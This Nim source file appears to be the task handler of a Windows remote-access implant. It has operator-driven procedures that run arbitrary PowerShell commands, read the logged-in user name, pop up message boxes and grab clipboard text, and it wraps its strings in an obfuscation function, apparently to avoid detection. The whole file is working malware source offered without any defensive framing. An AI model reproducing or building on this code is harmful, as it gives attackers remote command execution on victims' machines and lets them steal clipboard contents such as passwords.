import osproc
import posix
import json
import winim/lean
import winim/inc/lm
import winim/utils
import threadpool

import utils

proc shell*(task: JsonNode): string =
    var args: seq[JsonNode] = task["args"].getElems
    var command: string = args[0].getStr

    try:
        var commandOutput: string
        (commandOutput, _) = execCmdEx(obf("powershell ") & command)
        return commandOutput

    except: 
        return obf("Failed to run the command")

proc whoami*(task: JsonNode): string =
    try:
        var buffer = newWString(UNLEN + 1)
        var cb = DWORD buffer.len

        GetUserNameW(&buffer, &cb)
        buffer.setLen(cb - 1)

        return $buffer
    
    except Exception as e:
        return obf("Failed to get the current user: ") & e.msg

proc spawnMsgbox(body: string, title: string): void =
    discard MessageBox(0, body, title, 0)

proc msgBox*(task: JsonNode): string =
    var args: seq[JsonNode] = task["args"].getElems
    var title: string = args[0].getStr
    var body: string = args[1].getStr

    try:
        spawn spawnMsgbox(body, title)
        return ""

    except Exception as e:
        return obf("Failed to display the message box: ") & e.msg

proc getClipboard*(task: JsonNode): string =
    try:
        if OpenClipboard(0) == 0:
            return obf("Unable to open the clipboard")

        if IsClipboardFormatAvailable(CF_UNICODETEXT) == 0:
            CloseClipboard()
            return ""

        let hClipboardData = GetClipboardData(CF_UNICODETEXT)
        if hClipboardData == 0:
            CloseClipboard()
            return obf("Failed to get the clipboard")

        let pchData = GlobalLock(hClipboardData)
        if pchData == nil:
            CloseClipboard()
            return obf("Failed to get the clipboard")

        let clipboardText = $cast[LPWSTR](pchData)

        discard GlobalUnlock(hClipboardData)
        CloseClipboard()

        return clipboardText

    except Exception as e:
        return obf("Failed to get the clipboard: ") & e.msg
